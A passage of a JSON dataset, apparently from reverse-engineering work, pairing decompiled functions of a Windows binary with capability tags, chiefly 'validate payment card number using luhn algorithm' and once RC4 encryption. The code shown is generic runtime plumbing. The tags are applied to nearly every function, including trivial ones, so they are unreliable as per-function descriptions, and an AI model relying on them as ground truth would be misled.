        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h_2\n\nvoid fcn.00415e20(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_1ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint *arg_8h;\n    uint uStack60;\n    uchar auStack44 [4];\n    uint var_28h;\n    uchar *puStack36;\n    uchar *var_20h;\n    uint uStack28;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h_2;\n    uint var_ch_3;\n    uint var_4h_3;\n    uint var_4h_2;\n    \n    var_ch_3 = 0x4713e8;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00415e20::var_10h_2;\n    var_4h_3 = 0;\n    var_20h = &stack0xffffffc4;\n    arg_8h = &fcn.00415e20::var_8h;\n    fcn.00413a20(arg_8h);\n    uStack28 = fcn.00416c40(&stack0xffffffd4, param_1, arg_8h);\n    uStack60 = 0x415e85;\n    var_18h = uStack28;\n    fcn.00416b20(uStack28);\n    uStack60 = 0x415e8d;\n    fcn.0040e930();\n    uStack60 = 0x415e92;\n    iVar1 = fcn.004131e0();\n    if (param_1 != iVar1) {\n        puStack36 = &stack0xffffffc0;\n        fcn.00416340(var_14h);\n        fcn.00406250();\n        fcn.00414780(var_14h);\n    }\n    var_4h_3 = 0xffffffff;\n    fcn.00413a00();\n    *in_FS_OFFSET = var_10h_2;\n    return;\n}\n",
        "token_count": 499
    },
    "00415f10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00415f10(int32_t arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    if (in_ECX != arg_8h) {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.00416b20(arg_8h_00);\n    }\n    return in_ECX;\n}\n",
        "token_count": 103
    },
    "00415f40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00415f40(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00410490(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "00416240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00416240(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00412e60(1);\n    *in_ECX = vtable.Concurrency::details::_CancellationTokenCallback_class__lambda_3b8ab8d2629adf61a42ee3fe177a046b__.0\n    ;\n    fcn.00414900(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 107
    },
    "00416410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041642c)\n\nint32_t __cdecl fcn.00416410(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = fcn.00401440(arg_8h);\n    if (in_ECX != iVar1) {\n        uVar2 = fcn.00404960();\n        fcn.00406320(uVar2);\n        puVar3 = fcn.00404940();\n        uVar2 = *puVar3;\n        puVar3 = fcn.004072d0();\n        fcn.00417880(*puVar3, uVar2);\n    }\n    return in_ECX;\n}\n",
        "token_count": 180
    },
    "004164b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004164b0(uint param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint arg_ch;\n    uint32_t uStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t *var_11h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4714b0;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack48 = *0x49106c ^ &stack0xfffffffc;\n    *0x10 = &uStack48;\n    *in_FS_OFFSET = &var_ch_2;\n    fcn.00404960();\n    uVar2 = fcn.00401440(&var_11h);\n    fcn.00407f90(uVar2);\n    uVar2 = fcn.00416ec0();\n    cVar1 = fcn.00416e10(uVar2);\n    if (cVar1 != '\\0') {\n        var_4h = 0;\n        puVar3 = fcn.004072d0();\n        uVar2 = *puVar3;\n        puVar3 = fcn.00404940();\n        arg_ch = *puVar3;\n        puVar3 = fcn.004072d0();\n        uVar2 = fcn.004178c0(*puVar3, arg_ch, uVar2);\n        puVar3 = fcn.00404940();\n        *puVar3 = uVar2;\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return param_1;\n}\n",
        "token_count": 408
    },
    "00416820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00416820(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00415020(param_1);\n    fcn.00412f00();\n    return;\n}\n",
        "token_count": 64
    },
    "00416980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00416980(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint *arg_8h;\n    uint in_stack_ffffffc0;\n    uint in_stack_ffffffc4;\n    uint *arg_14h;\n    uint var_1ch_2;\n    uint var_18h_2;\n    uint32_t var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    int32_t var_4h_2;\n    \n    uStack12 = 0x4714e0;\n    var_ch_2 = *in_FS_OFFSET;\n    var_10h_2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h_2 = 0;\n    fcn.00401b10(8);\n    fcn.00416710(in_ECX + 0x14);\n    var_4h_2._0_1_ = 1;\n    arg_14h = &var_18h_2;\n    arg_8h = &var_8h;\n    fcn.00411730(arg_8h);\n    fcn.00416ff0(arg_8h, in_stack_ffffffc0, in_stack_ffffffc4, arg_14h);\n    var_4h_2 = var_4h_2._1_3_ << 8;\n    fcn.004166c0();\n    var_4h_2 = 0xffffffff;\n    fcn.004116e0();\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0043a2e7(in_stack_ffffffc0);\n    return;\n}\n",
        "token_count": 553
    },
    "00416a30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416a30(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_ch_00;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470f78;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00401b10(8);\n    fcn.00416710(in_ECX + 0x14);\n    var_4h = 0;\n    arg_ch = arg_ch & 0xff;\n    arg_ch_00 = &var_18h;\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00417090(arg_8h_00, arg_ch_00, arg_ch);\n    var_4h = 0xffffffff;\n    fcn.004166c0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_ch_00);\n    return;\n}\n",
        "token_count": 309
    },
    "00416ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416ad0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint var_4h;\n    \n    piVar2 = param_1 + 4;\n    LOCK();\n    iVar1 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if (iVar1 == 1) {\n        fcn.00416f70();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00416b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00416b20(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    uint var_ch;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00410490(arg_8h_00);\n    fcn.004170f0(arg_8h_00);\n    fcn.0040e930();\n    return in_ECX;\n}\n",
        "token_count": 110
    },
    "00416b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416b80(uint arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_01;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471518;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_01 = &arg_8h;\n    fcn.00416b00(arg_8h_01);\n    arg_8h_00 = in_ECX + 0x14;\n    fcn.00416660(arg_8h_00);\n    var_4h = 0;\n    cVar1 = fcn.004149f0(arg_8h_00, arg_8h_01, uVar2);\n    if (cVar1 == '\\0') {\n        *(in_ECX + 4) = 3;\n        var_4h = 0xffffffff;\n        fcn.00416620();\n        fcn.00413900();\n        fcn.00414f60();\n    }\n    else {\n        var_4h = 0xffffffff;\n        fcn.00416620();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_01);\n    return;\n}\n",
        "token_count": 383
    },
    "00416c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.00416c40(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x471548;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    fcn.004178f0(arg_8h, &arg_ch, &arg_10h);\n    var_4h = 0xffffffff;\n    fcn.00413a00(uVar1, 1);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 211
    },
    "00416ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416ff0(uint arg_8h, uint noname_1, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_18h;\n    int32_t *var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x471578;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    var_10h = in_ECX;\n    if (*(in_ECX + 0x75) != '\\0') {\n        arg_8h_00 = fcn.00415240(&var_18h, 3);\n        fcn.00426c72(arg_8h_00);\n    }\n    fcn.00411780(&arg_8h);\n    (**(*var_10h + 0x14))(arg_10h, arg_14h & 0xff);\n    var_4h = 0xffffffff;\n    fcn.004116e0();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 281
    },
    "00417090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417090(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    if (*(in_ECX + 0x75) != '\\0') {\n        arg_8h_00 = fcn.00415240(&var_ch, 3);\n        fcn.00426c72(arg_8h_00);\n    }\n    piVar1 = fcn.00401440(arg_8h);\n    var_4h[2] = *piVar1;\n    (**(*var_4h + 0x14))(arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 190
    },
    "00417110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417110(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_10h;\n    uint var_4h;\n    \n    arg_10h = fcn.00404960();\n    fcn.004179f0(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 74
    },
    "00417170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00417170(void)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00404960();\n    var_8h = fcn.00417240(uVar1);\n    var_ch = fcn.004012f0();\n    puVar2 = fcn.00407940(&var_ch, &var_8h);\n    return *puVar2;\n}\n",
        "token_count": 113
    },
    "004171b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004171b0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00417a20(arg_8h);\n    fcn.00408d10(arg_8h_00);\n    return;\n}\n",
        "token_count": 74
    },
    "004171e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004171e0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    fcn.00408d50(arg_8h, arg_ch << 2);\n    return;\n}\n",
        "token_count": 55
    },
    "00417200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417200(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.00417a50(in_ECX, arg_8h);\n    fcn.00417a50(in_ECX + 4, arg_8h + 4);\n    return;\n}\n",
        "token_count": 79
    },
    "004172a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004172a0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint *puVar4;\n    code *arg_8h_00;\n    uchar auStack36 [8];\n    uint var_18h_2;\n    uint32_t var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x4715a8;\n    var_ch_2 = *in_FS_OFFSET;\n    var_10h_2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    fcn.00401b10(8);\n    fcn.00411690();\n    var_4h_2 = 0;\n    puVar4 = &var_18h_2;\n    uVar2 = fcn.00401440(noname_1);\n    fcn.00417c20(uVar2, puVar4);\n    uVar2 = fcn.00401440(auStack36);\n    arg_8h_00 = fcn.00417c60;\n    iVar3 = fcn.00425875(noname_0, fcn.00417c60, uVar2);\n    if (iVar3 == 0) {\n        cVar1 = fcn.004117d0();\n        if (cVar1 != '\\0') {\n            puVar4 = &var_18h_2;\n            fcn.00411730(puVar4);\n            fcn.004118e0(puVar4);\n        }\n        fcn.0042588d();\n        var_4h_2 = 0xffffffff;\n        fcn.004116e0();\n    }\n    else {\n        var_4h_2 = 0xffffffff;\n        fcn.004116e0();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 634
    },
    "00417610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417610(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471488;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00416d60(uVar1);\n    var_4h = 0;\n    arg_8h_00 = fcn.00401440(&arg_8h);\n    fcn.00417e10(arg_8h_00);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 207
    },
    "00417700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00417700(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00425875(0x496184, fcn.00417e90, 0x496178);\n    if (iVar1 == 0) {\n        fcn.004567ea();\n    }\n    return 0x496178;\n}\n",
        "token_count": 78
    },
    "00417730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417730(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_10h;\n    uint arg_ch_00;\n    uint var_4h;\n    \n    arg_10h = fcn.00401440(arg_ch);\n    arg_ch_00 = fcn.00415230(1, 2);\n    fcn.00417ef0(arg_8h, arg_ch_00, arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 107
    },
    "00417780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417780(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471488;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00416d60(uVar1);\n    var_4h = 0;\n    arg_8h_00 = fcn.00401440(&arg_8h);\n    fcn.00417fb0(arg_8h_00);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 207
    },
    "00417880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00417880(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_ch_00 = fcn.00401440(arg_ch);\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00417ff0(arg_8h_00, arg_ch_00);\n    return;\n}\n",
        "token_count": 126
    },
    "004178c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004178c0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_14h;\n    uint var_4h;\n    \n    arg_14h = fcn.00404960();\n    fcn.004181a0(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 86
    },
    "004179f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004179f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    fcn.00408580(arg_8h, arg_ch, arg_10h, in_ECX >> 0x18);\n    return;\n}\n",
        "token_count": 93
    },
    "00417a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.00417a50(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    puVar1 = fcn.00401440(arg_8h);\n    var_8h = *puVar1;\n    puVar1 = fcn.00401440(arg_ch);\n    *arg_8h = *puVar1;\n    puVar1 = fcn.00401440(&var_8h);\n    *arg_ch = *puVar1;\n    fcn.0043a2e7(var_8h);\n    return;\n}\n",
        "token_count": 182
    },
    "00417b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00417b00(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0x10;\n}\n",
        "token_count": 41
    },
    "00417c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00417c20(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_10h;\n    uint arg_ch_00;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_10h = fcn.00401440(arg_ch);\n    arg_ch_00 = fcn.00401440(arg_8h);\n    fcn.004188d0(0, arg_ch_00, arg_10h);\n    return in_ECX;\n}\n",
        "token_count": 133
    },
    "00417c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00417c60(uint param_1, uint param_2)\n\n{\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_18h;\n    uint var_11h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4716b0;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    var_4h = 0;\n    arg_8h = fcn.00401440(var_ch_2);\n    fcn.00418920(arg_8h);\n    *in_FS_OFFSET = var_ch_3;\n    return 1;\n}\n",
        "token_count": 183
    },
    "00417dd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00417dd0(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = fcn.00418950(arg_8h);\n    if (cVar1 != '\\0') {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.00418990(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00417e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00417e10(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = fcn.00418950(arg_8h);\n    if (cVar1 != '\\0') {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.00418a00(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00417e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00417e50(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = fcn.00418950(arg_8h);\n    if (cVar1 != '\\0') {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.00418a70(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00417ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417ef0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint8_t var_1dh;\n    uint var_1ch;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471708;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00401b10(0xc);\n    uVar1 = fcn.00401440(arg_10h);\n    uVar1 = fcn.00418440(uVar1);\n    uVar1 = fcn.00418aa0(arg_ch, uVar1);\n    fcn.004159e0(uVar1);\n    var_4h = 0;\n    arg_8h_00 = var_1dh;\n    uVar1 = fcn.00415980();\n    fcn.004153e0(uVar1);\n    var_4h = 0xffffffff;\n    fcn.00415400();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 320
    },
    "00417fb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00417fb0(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = fcn.00418950(arg_8h);\n    if (cVar1 != '\\0') {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.00418c30(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004181a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.004181a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint var_14h;\n    uchar var_eh [2];\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_ch = fcn.00401440(arg_8h);\n    arg_ch_00 = fcn.00401440(arg_ch);\n    var_8h = fcn.00401440(arg_10h);\n    fcn.00401440(var_eh);\n    arg_ch_01 = fcn.00418d00(var_ch, arg_ch_00, var_8h);\n    fcn.00409ff0(&arg_10h, arg_ch_01);\n    fcn.0043a2e7(arg_ch_00);\n    return;\n}\n",
        "token_count": 242
    },
    "0456396a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nmethod.std::_Func_impl_no_alloc_class__lambda_0456396a71e3abd88ede77bdd2823d8e___void___.virtual_16(uint arg_8h)\n\n{\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_8h != '\\0') {\n        fcn.00408d50(in_ECX, 8);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 170
    },
    "00418440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
